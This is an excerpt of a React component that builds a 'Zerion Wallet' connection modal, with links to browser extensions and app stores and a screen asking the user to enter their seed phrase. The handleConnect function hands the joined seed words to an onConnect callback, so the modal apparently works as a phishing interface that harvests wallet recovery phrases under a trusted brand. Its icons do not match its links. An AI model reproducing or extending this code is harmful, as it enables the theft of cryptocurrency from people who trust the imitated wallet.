...
export default function ZerionWalletModal({ onClose, onConnect, onBack, onStartConnect }) {
  ...
  const handleConnect = () => {
    ...
    if (onConnect) {
      onConnect('Zerion Wallet', seedWords.join(' '));
    }
    if (onClose) onClose();
  };
    ...
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          ...
          <h2 style={{ margin: 0, textAlign: 'center' }}>Zerion Wallet</h2>
          ...
          {!showSeedInput ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/Zerion.log.png" alt="Zerion" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  Connect Zerion with the extension or mobile app, then import your wallet or use the Zerion wallet directly.
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get Zerion</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://chrome.google.com/webstore/detail/zerion-wallet/oddcnihgbohfcimpmolomjnacfpkakjd"
                    target="_blank"
                  ...
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/brave-logo.svg" alt="Brave" style={{ width: 24, height: 24 }} />
                  ...
                  <a
                    href="https://addons.mozilla.org/en-US/firefox/addon/zerion-wallet/"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                  ...
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/arc-browr-ico.svg" alt="ARC" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>ARC Extension</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://apps.apple.com/app/zerion-web3-wallet/id1570458696"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                  ...
                  <a
                    href="https://play.google.com/store/apps/details?id=io.zerion.app"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
            ...
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your Zerion seed phrase to continue
              </p>
